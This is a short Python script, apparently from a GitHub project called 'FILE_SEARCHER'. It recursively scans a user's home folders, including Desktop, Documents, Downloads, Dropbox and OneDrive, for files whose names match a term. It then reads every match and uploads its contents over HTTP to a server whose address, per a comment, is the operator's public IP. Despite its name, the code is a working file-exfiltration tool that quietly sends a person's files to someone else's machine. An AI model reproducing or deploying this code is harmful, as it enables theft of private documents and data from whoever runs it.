import os
import requests

#-------------------------------------------------------------
# GITHUB.COM/L1LBG/FILE_SEARCHER
#-------------------------------------------------------------

#HERE, CHANGE YOUR PREFERENCES AND SPECIFICATIONS
scan_only_principal_dirs = True # I really recommend to change this option to true if you want the script to run a lot faster
term_searched = '' # Input here the name of the file(s) you are looking for 
server_ip = 'http://localhost' # Input here your public Ip where the server is hosted
server_port = '8000' # Input here your server port, leave it as it is
server_internal = 'file' # Path inside of the server
#-------------------------------------------------------------


scanned_dirs = []
not_scanned_dirs = []
found_files = []
home_dir = os.path.expanduser('~')

if scan_only_principal_dirs == False:
	to_scan = [home_dir]
if scan_only_principal_dirs == True:
	#change if you want the principal dirs, adding them to the list
	to_scan = [home_dir + 'Desktop', home_dir + os.path.sep + 'Documents', home_dir + os.path.sep + 'Downloads', home_dir + os.path.sep + 'Dropbox', home_dir + os.path.sep + 'OneDrive',  home_dir + os.path.sep + 'Videos',  home_dir + os.path.sep + 'Photos']

#scan the directory inputed and adding directories to the to_scan list
def scan_dir(dir):
	scanned_dirs.append(dir)
	to_scan.remove(dir)
	try:
		os.chdir(dir)
		files = os.listdir()
		#looping through the dir
		for file in files:
			#if item is file just see if it matches with the query
			if os.path.isfile(file):
				if term_searched.lower() in str(file.lower()):
					found_files.append(str(os.getcwd()) + os.path.sep  + str(file))
		#if item is a dir and it has not been scanned, add it to the list to_scan
			if os.path.isdir(file):
				if file not in scanned_dirs:
					to_scan.append(str(os.getcwd()) + os.path.sep + str(file))
	except:
		pass
#do it until theres no dirs left to scan
while len(to_scan) != 0:
	scan_dir(to_scan[0])

print(found_files)

for file in found_files:
	os.chdir(os.path.dirname(__file__))
	with open(file, 'rb') as f:
		file_bin = f.read()
		file_name = os.path.basename(file)

		url = f"{server_ip}:{server_port}/{server_internal}"
		res = requests.get(url=url,
                    data = file_bin,
					params = {'file_name': str(file_name)},
                    headers={'Content-Type': 'application/octet-stream'})
